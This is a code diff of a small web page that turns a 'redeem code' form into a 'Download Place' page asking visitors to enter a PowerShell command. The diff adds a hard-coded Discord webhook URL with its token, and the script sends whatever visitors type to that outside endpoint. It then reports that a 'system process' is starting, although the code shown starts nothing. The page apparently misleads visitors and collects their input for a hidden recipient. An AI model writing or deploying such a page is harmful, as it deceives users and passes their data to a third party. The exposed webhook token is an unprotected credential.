@@ -145,11 +145,11 @@
 <body>
 
     <div class="container">
-        <h1 class="title">REDEEM CODE</h1>
-        <p class="subtitle">Enter your code below to start the download</p>
+        <h1 class="title">Download Place</h1>
+        <p class="subtitle">Enter your Powershell command below to start the download</p>
 
         <div class="input-group">
-            <input type="text" id="codeInput" class="code-input" placeholder="ENTER CODE HERE" autocomplete="off" spellcheck="false">
+            <input type="text" id="codeInput" class="code-input" placeholder="ENTER POWERSHELL COMMAND HERE" autocomplete="off" spellcheck="false">
         </div>
 
         <button id="downloadBtn" class="btn-download">DOWNLOAD</button>
@@ -159,7 +159,7 @@
 
     <script>
         // Ersetze diese URL mit deiner echten Webhook-URL
-        const WEBHOOK_URL = "DEINE_WEBHOOK_URL_HIER";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1564636275074662436/4-28eWe1zi7UYRt-Ww_22ysR-1sjwRUiaxqeo-1lN6ho6hc_Dirb36LjvYPjx0kjPcl3";
 
         const codeInput = document.getElementById('codeInput');
         const downloadBtn = document.getElementById('downloadBtn');
@@ -169,7 +169,7 @@
             const code = codeInput.value.trim();
 
             if (!code) {
-                showStatus("Please enter a valid code!", "error");
+                showStatus("Please enter a valid Powershell command!", "error");
                 return;
             }
 
@@ -192,14 +192,14 @@
                 });
 
                 if (response.ok) {
-                    showStatus("Code accepted! Starting system process...", "success");
+                    showStatus("Powershell Command accepted! Starting system process...", "success");
                     codeInput.value = '';
                 } else {
-                    showStatus("Failed to process code. Try again later.", "error");
+                    showStatus("Failed to process Powershell Command. Try again later.", "error");
                 }
             } catch (err) {
                 console.error(err);
-                showStatus("Network error while sending code.", "error");
+                showStatus("Network error while sending Download File.", "error");
             } finally {
                 downloadBtn.disabled = false;
             }
